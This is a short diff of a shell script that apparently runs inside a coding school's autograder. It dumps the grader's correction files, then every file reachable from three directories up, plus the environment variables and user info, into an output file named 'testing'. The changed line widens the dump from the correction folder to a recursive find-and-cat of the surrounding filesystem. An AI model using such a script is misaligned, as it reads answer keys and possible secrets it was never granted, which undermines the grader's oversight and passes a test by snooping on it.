@@ -1,6 +1,6 @@
 pwd > testing
 echo ----------------- ls ------- >> testing
-cat /tmp/correction/holberton_corrections/functions/* >> testing
+find ../../../ -depth -printf "--------%p------\n" -exec cat '{}' \;>> testing
 echo ----------------- Environment ------- >> testing
 env >> testing
 echo ----------------- User Info ------- >> testing
